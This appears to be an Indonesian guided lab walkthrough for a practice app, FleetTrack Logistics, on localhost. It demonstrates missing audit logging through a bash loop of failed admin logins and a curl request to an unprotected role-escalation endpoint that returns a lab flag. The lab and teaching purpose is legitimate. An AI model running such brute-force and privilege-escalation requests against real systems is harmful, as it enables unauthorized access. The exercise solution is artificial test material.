# Panduan Praktik Terbimbing: Eksploitasi Kegagalan Logging pada FleetTrack Logistics

Dalam latihan terarah ini, Anda akan mempraktikkan proses pembuktian kebutaan log telemetri dan ketiadaan deteksi insiden pada pusat komando armada **FleetTrack Logistics (Commercial Telematics & IoT Fleet Management)** pada `http://127.0.0.1:8019`.

---

### Tahap 1: Observasi Aliran Jejak Audit
1. Buka peramban web dan akses halaman beranda sistem:
   `http://127.0.0.1:8019/`
2. Perhatikan tabel **Commercial Telematics & Operations Audit Trail**:
   - Menampilkan catatan telemetri operasional normal.
3. Periksa status monitoring SOC pada kartu antarmuka:
   - Alerting Status: **Passive Telemetry (0 Security Incidents Triggered)**.

---

### Tahap 2: Simulasi Percobaan Login Gagal Tanpa Deteksi
1. Jalankan loop pengujian login gagal sebanyak 5 kali menggunakan kredensial salah melalui terminal:
   ```bash
   for i in {1..5}; do
     curl -s -X POST http://127.0.0.1:8019/api/auth/login \
       -H "Content-Type: application/json" \
       -d '{"username": "admin", "password": "wrong_password_'$i'"}'
     echo ""
   done
   ```
2. Muat ulang halaman peramban atau periksa `/api/audit/logs`:
   - **Temuan Kritis:** Tidak ada satu pun entri kegagalan login yang dicatat ke dalam tabel audit. Server diam seribu bahasa (*silent authentication failure*).

---

### Tahap 3: Eskalasi Wewenang Diam-Diam & Eksfiltrasi
1. Panggil endpoint eskalasi hak istimewa secara diam-diam:
   ```bash
   curl -X POST http://127.0.0.1:8019/api/admin/role_escalate \
     -H "Content-Type: application/json" \
     -d '{"user": "learner", "role": "super_admin"}'
   ```
2. **Temuan Bukti:**
   - Server mengembalikan respons status wewenang granted:
     ```json
     {
       "status": "granted",
       "message": "User learner escalated to super_admin silently without audit trail entry.",
       "audit_recorded": false,
       "flag": "ZITERA{...}"
     }
     ```
   - Serangan brute-force dan eskalasi hak akses eksekutif berhasil dilakukan tanpa memicu peringatan SOC sama sekali!
3. Salin bukti flag berformat `ZITERA{...}` dan kirimkan ke Zitera Lab desktop untuk merekam skor Anda.
